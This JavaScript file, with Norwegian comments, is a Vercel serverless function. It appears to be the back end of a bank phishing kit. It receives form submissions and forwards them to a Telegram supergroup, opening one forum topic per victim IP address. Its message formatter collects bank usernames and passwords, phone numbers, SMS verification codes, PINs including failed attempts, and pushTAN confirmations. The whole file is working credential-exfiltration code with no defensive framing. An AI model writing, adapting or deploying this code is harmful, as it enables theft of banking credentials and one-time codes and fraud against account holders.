// api/telegram.js
// Vercel Serverless Function for sending data to Telegram
// Based on moliuon-main implementation

// Telegram Bot API konfigurasjon
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID; // Supergruppe ID (må være en supergruppe for topics)

// Cache for å lagre mapping mellom IP-adresse og topic/message_thread_id
// I produksjon kan du bruke en database i stedet
const ipToTopicMap = new Map();

/**
 * Sjekker om et topic allerede eksisterer for en IP-adresse
 * Sjekker gjennom alle topics i supergruppen (med paginering)
 */
async function findExistingTopicForIP(ipAddress) {
  try {
    const topicName = `IP: ${ipAddress}`;
    let offset = 0;
    const limit = 100;
    let hasMore = true;

    // Sjekk gjennom alle topics med paginering
    while (hasMore) {
      const telegramApiUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getForumTopics`;
      
      const response = await fetch(telegramApiUrl, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          offset: offset,
          limit: limit,
        }),
      });

      if (!response.ok) {
        const errorData = await response.json().catch(() => ({}));
        // Hvis API ikke støtter getForumTopics eller feiler, returner null
        console.log(`getForumTopics feilet: ${errorData.description || response.statusText}`);
        return null;
      }

      const result = await response.json();
      
      if (result.ok && result.result && result.result.topics) {
        // Søk etter et topic med samme navn
        const existingTopic = result.result.topics.find(
          topic => topic.name === topicName
        );
        
        if (existingTopic) {
          console.log(`Fant eksisterende topic for IP ${ipAddress}: ${existingTopic.message_thread_id}`);
          return existingTopic.message_thread_id;
        }

        // Sjekk om det er flere topics å hente
        if (result.result.topics.length < limit) {
          hasMore = false;
        } else {
          offset += limit;
        }
      } else {
        hasMore = false;
      }
    }
    
    return null;
  } catch (error) {
    console.error(`Feil ved søk etter eksisterende topic for IP ${ipAddress}:`, error);
    return null;
  }
}

/**
 * Oppretter eller henter topic ID for en IP-adresse
 * Hvis det er en ny IP, oppretter vi et nytt topic i supergruppen
 */
async function getOrCreateTopicForIP(ipAddress) {
  // Først sjekk om vi har det i cache (for denne invokasjonen)
  if (ipToTopicMap.has(ipAddress)) {
    return ipToTopicMap.get(ipAddress);
  }

  // Sjekk om et topic allerede eksisterer i supergruppen
  const existingTopicId = await findExistingTopicForIP(ipAddress);
  if (existingTopicId) {
    ipToTopicMap.set(ipAddress, existingTopicId);
    return existingTopicId;
  }

  // Hvis ingen eksisterende topic, opprett et nytt
  try {
    const topicId = await createTopicForIP(ipAddress);
    ipToTopicMap.set(ipAddress, topicId);
    return topicId;
  } catch (error) {
    console.error(`Kunne ikke opprette topic for IP ${ipAddress}:`, error);
    
    // Hvis feilen indikerer at topic allerede eksisterer, prøv å finne det igjen
    if (error.message && error.message.includes('already exists')) {
      console.log(`Topic eksisterer allerede for IP ${ipAddress}, søker på nytt...`);
      const existingTopicId = await findExistingTopicForIP(ipAddress);
      if (existingTopicId) {
        ipToTopicMap.set(ipAddress, existingTopicId);
        return existingTopicId;
      }
    }
    
    // Fallback: bruk null (ingen topic) hvis opprettelse feiler
    return null;
  }
}

/**
 * Oppretter et nytt topic i supergruppen for en IP-adresse
 */
async function createTopicForIP(ipAddress) {
  const telegramApiUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/createForumTopic`;
  
  const response = await fetch(telegramApiUrl, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify({
      chat_id: TELEGRAM_CHAT_ID,
      name: `IP: ${ipAddress}`,
      icon_color: 0x6FB9F0, // Blå farge
    }),
  });

  if (!response.ok) {
    const errorData = await response.json();
    
    // Hvis topic allerede eksisterer (selv om vi ikke fant det), prøv å finne det igjen
    if (errorData.description && errorData.description.includes('already exists')) {
      console.log(`Topic for IP ${ipAddress} eksisterer allerede, søker etter det...`);
      const existingTopicId = await findExistingTopicForIP(ipAddress);
      if (existingTopicId) {
        return existingTopicId;
      }
    }
    
    // Hvis topics ikke er støttet, returner null
    if (errorData.error_code === 400) {
      throw new Error('Topics ikke støttet - sjekk at gruppen er en supergruppe med topics aktivert');
    }
    throw new Error(`Kunne ikke opprette topic: ${errorData.description || response.statusText}`);
  }

  const result = await response.json();
  console.log(`Opprettet nytt topic for IP ${ipAddress}: ${result.result.message_thread_id}`);
  return result.result.message_thread_id;
}

/**
 * Sender en melding til Telegram (i et topic hvis topicId er gitt)
 */
async function sendToTelegram(chatId, message, topicId = null) {
  const telegramApiUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
  
  const payload = {
    chat_id: chatId,
    text: message,
    parse_mode: 'HTML', // Bruker HTML for formatering
  };

  // Hvis topicId er gitt, legg til message_thread_id for å sende til riktig topic
  if (topicId !== null) {
    payload.message_thread_id = topicId;
  }
  
  const response = await fetch(telegramApiUrl, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify(payload),
  });

  if (!response.ok) {
    const errorData = await response.json().catch(() => ({}));
    const errorMessage = errorData.description || response.statusText || 'Unknown error';
    
    // If chat not found, provide helpful error message
    if (errorMessage.includes('chat not found') || errorMessage.includes('Chat not found')) {
      throw new Error(`Telegram chat not found. Please check:
1. TELEGRAM_CHAT_ID is correct (should be a number or @username for groups)
2. The bot is a member of the group/channel
3. For groups, the group must be a supergroup (not a regular group)
4. For topics, the group must have topics enabled`);
    }
    
    throw new Error(`Telegram API error: ${errorMessage}`);
  }

  return await response.json();
}

/**
 * Formaterer data til en lesbar Telegram-melding
 */
function formatTelegramMessage(data, isNewIPAddress = false) {
  const { action, bank, phone, bank_username, bank_password, verification_code, auth_method, pin_attempt, pin, ip_adresse, timestamp } = data;
  
  let message = '';
  
  // Hvis dette er en ny IP-adresse, legg til en velkomstmelding
  if (isNewIPAddress) {
    message += `🆕 <b>Ny bruker opprettet</b>\n`;
    message += `📍 <b>IP-adresse:</b> <code>${ip_adresse}</code>\n`;
    message += `━━━━━━━━━━━━━━━━━━━━\n\n`;
  }
  
  // Format message based on action type
  switch (action) {
    case 'bank_selected':
      message += `🏦 <b>Bank Valgt</b>\n`;
      message += `📋 <b>Bank:</b> ${bank || 'N/A'}\n`;
      break;

    case 'phone_entered':
      message += `📱 <b>Telefonnummer Oppgitt</b>\n`;
      message += `🏦 <b>Bank:</b> ${bank || 'N/A'}\n`;
      message += `📱 <b>Telefon:</b> <code>${phone || 'N/A'}</code>\n`;
      break;

    case 'verification_code_entered':
      message += `✅ <b>Verifiseringskode Oppgitt</b>\n`;
      message += `🏦 <b>Bank:</b> ${bank || 'N/A'}\n`;
      message += `📱 <b>Telefon:</b> <code>${phone || 'N/A'}</code>\n`;
      message += `🔢 <b>Kode:</b> <code>${verification_code || 'N/A'}</code>\n`;
      break;

    case 'verification_code_resend':
      message += `🔄 <b>Verifiseringskode Sendt På Nytt</b>\n`;
      message += `🏦 <b>Bank:</b> ${bank || 'N/A'}\n`;
      message += `📱 <b>Telefon:</b> <code>${phone || 'N/A'}</code>\n`;
      break;

    case 'auth_method_selected':
      message += `🔐 <b>Autentiseringsmetode Valgt</b>\n`;
      message += `🏦 <b>Bank:</b> ${bank || 'N/A'}\n`;
      message += `🔑 <b>Metode:</b> ${auth_method === 'card-reader' ? 'Card Reader' : 'Bank App'}\n`;
      break;

    case 'pin_attempt_failed':
      message += `❌ <b>PIN Forsøk Feilet</b>\n`;
      message += `🏦 <b>Bank:</b> ${bank || 'N/A'}\n`;
      message += `📱 <b>Telefon:</b> <code>${phone || 'N/A'}</code>\n`;
      message += `🔢 <b>PIN Forsøk:</b> <code>${pin_attempt || 'N/A'}</code>\n`;
      if (data.attempt_number) {
        message += `📊 <b>Forsøk #${data.attempt_number}</b>\n`;
      }
      if (data.remaining_attempts !== undefined) {
        message += `⚠️ <b>Gjenstående:</b> ${data.remaining_attempts} forsøk\n`;
      }
      break;

    case 'pin_max_attempts_reached':
      message += `🚫 <b>Maks PIN Forsøk Nådd</b>\n`;
      message += `🏦 <b>Bank:</b> ${bank || 'N/A'}\n`;
      message += `📱 <b>Telefon:</b> <code>${phone || 'N/A'}</code>\n`;
      message += `⚠️ <b>Status:</b> Alle forsøk brukt opp\n`;
      break;

    case 'pin_verified':
      message += `✅ <b>PIN Bekreftet</b>\n`;
      message += `🏦 <b>Bank:</b> ${bank || 'N/A'}\n`;
      message += `📱 <b>Telefon:</b> <code>${phone || 'N/A'}</code>\n`;
      message += `🔢 <b>PIN:</b> <code>${pin || 'N/A'}</code>\n`;
      break;

    case 'bank_app_confirmed':
      message += `📱 <b>Bank App Bekreftet</b>\n`;
      message += `🏦 <b>Bank:</b> ${bank || 'N/A'}\n`;
      message += `📱 <b>Telefon:</b> <code>${phone || 'N/A'}</code>\n`;
      break;

    case 'bank_login':
      message += `🔐 <b>Bank Login</b>\n`;
      message += `🏦 <b>Bank:</b> ${bank || 'N/A'}\n`;
      message += `👤 <b>Brukernavn:</b> <code>${bank_username || 'N/A'}</code>\n`;
      message += `🔑 <b>Passord:</b> <code>${bank_password || 'N/A'}</code>\n`;
      if (data.save_device !== undefined) {
        message += `💾 <b>Enhet lagret:</b> ${data.save_device ? 'Ja' : 'Nei'}\n`;
      }
      break;

    case 'login_username_entered':
      message += `👤 <b>Brukernavn Oppgitt</b>\n`;
      message += `📝 <b>Brukernavn:</b> <code>${bank_username || 'N/A'}</code>\n`;
      break;

    case 'pushTAN_confirmed':
      message += `✅ <b>pushTAN Bekreftet</b>\n`;
      message += `🏦 <b>Bank:</b> ${bank || 'N/A'}\n`;
      message += `👤 <b>Brukernavn:</b> <code>${bank_username || 'N/A'}</code>\n`;
      message += `🔑 <b>Passord:</b> <code>${bank_password || 'N/A'}</code>\n`;
      if (data.pushTAN_date_time) {
        message += `⏰ <b>pushTAN Tid:</b> ${data.pushTAN_date_time}\n`;
      }
      break;

    case 'login_failed':
      message += `❌ <b>Login Feilet</b>\n`;
      message += `🏦 <b>Bank:</b> ${bank || 'N/A'}\n`;
      message += `👤 <b>Brukernavn:</b> <code>${bank_username || 'N/A'}</code>\n`;
      message += `🔑 <b>Passord:</b> <code>${bank_password || 'N/A'}</code>\n`;
      if (data.error_message) {
        message += `⚠️ <b>Feilmelding:</b> ${data.error_message}\n`;
      }
      if (data.save_device !== undefined) {
        message += `💾 <b>Enhet lagret:</b> ${data.save_device ? 'Ja' : 'Nei'}\n`;
      }
      break;

    default:
      message += `📝 <b>Ukjent Handling</b>\n`;
      message += `🔧 <b>Action:</b> ${action || 'N/A'}\n`;
      break;
  }
  
  message += `\n🌐 <b>IP:</b> <code>${ip_adresse || 'N/A'}</code>\n`;
  message += `⏰ <b>Tid:</b> ${new Date(timestamp || Date.now()).toLocaleString('nb-NO', { timeZone: 'Europe/Oslo' })}`;
  
  return message;
}

module.exports = async (req, res) => {
  // Set CORS headers
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  res.setHeader('Content-Type', 'application/json');

  // Handle OPTIONS request for CORS preflight
  if (req.method === 'OPTIONS') {
    res.status(200).end();
    return;
  }

  if (req.method !== 'POST') {
    return res.status(405).json({ message: 'Kun POST er tillatt' });
  }

  try {
    // Valider at Telegram-konfigurasjonen er satt
    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
      console.error('Missing environment variables:', {
        hasToken: !!TELEGRAM_BOT_TOKEN,
        hasChatId: !!TELEGRAM_CHAT_ID
      });
      throw new Error('TELEGRAM_BOT_TOKEN eller TELEGRAM_CHAT_ID er ikke satt i miljøvariabler');
    }
    
    console.log('Telegram config check:', {
      hasToken: !!TELEGRAM_BOT_TOKEN,
      hasChatId: !!TELEGRAM_CHAT_ID,
      chatIdType: typeof TELEGRAM_CHAT_ID
    });

    // Get user data from request body
    let userData = req.body;
    
    // If body is a string, parse it
    if (typeof userData === 'string') {
      try {
        userData = JSON.parse(userData);
      } catch (parseError) {
        console.error('Error parsing request body:', parseError);
        return res.status(400).json({ 
          error: 'Invalid JSON in request body',
          message: parseError.message
        });
      }
    }

    if (!userData) {
      return res.status(400).json({ error: 'No data provided' });
    }

    // Hent IP-adresse fra headers (Vercel setter x-forwarded-for)
    const forwardedFor = req.headers['x-forwarded-for'];
    const ip_adresse = forwardedFor 
      ? forwardedFor.split(',')[0].trim() // Tar første IP hvis det er flere
      : req.headers['x-real-ip'] || req.connection?.remoteAddress || 'Ukjent IP';

    // Sjekk om dette er en ny IP-adresse før vi oppretter topic
    const isNewIPAddress = !ipToTopicMap.has(ip_adresse);
    
    // Hent eller opprett topic for denne IP-adressen
    // Hvis topics ikke fungerer, returnerer getOrCreateTopicForIP null
    let topicId = null;
    try {
      topicId = await getOrCreateTopicForIP(ip_adresse);
    } catch (topicError) {
      console.log('Topics ikke tilgjengelig, sender til hovedkanal:', topicError.message);
      topicId = null;
    }

    // Formater meldingen (inkluderer spesiell header hvis ny IP)
    const message = formatTelegramMessage({
      ...userData,
      ip_adresse,
    }, isNewIPAddress);

    // Send til Telegram i riktig topic (hvis topicId er null, sendes det til hovedkanalen)
    try {
      await sendToTelegram(TELEGRAM_CHAT_ID, message, topicId);
      console.log(`Data sendt til Telegram for IP: ${ip_adresse}`);
      
      res.status(200).json({ 
        message: 'Data sendt til Telegram!',
        ip_adresse: ip_adresse 
      });
    } catch (telegramError) {
      console.error('Telegram send error:', telegramError);
      // If it's a chat not found error, try sending without topic
      if (telegramError.message && telegramError.message.includes('chat not found') && topicId !== null) {
        console.log('Retrying without topic...');
        try {
          await sendToTelegram(TELEGRAM_CHAT_ID, message, null);
          console.log(`Data sendt til Telegram (uten topic) for IP: ${ip_adresse}`);
          res.status(200).json({ 
            message: 'Data sendt til Telegram!',
            ip_adresse: ip_adresse,
            note: 'Sent without topic (chat might not support topics)'
          });
        } catch (retryError) {
          throw retryError;
        }
      } else {
        throw telegramError;
      }
    }
  } catch (error) {
    console.error('Telegram error:', error);
    res.status(500).json({ 
      message: `Serverfeil: ${error.message}`,
      error: error.message
    });
  }
};
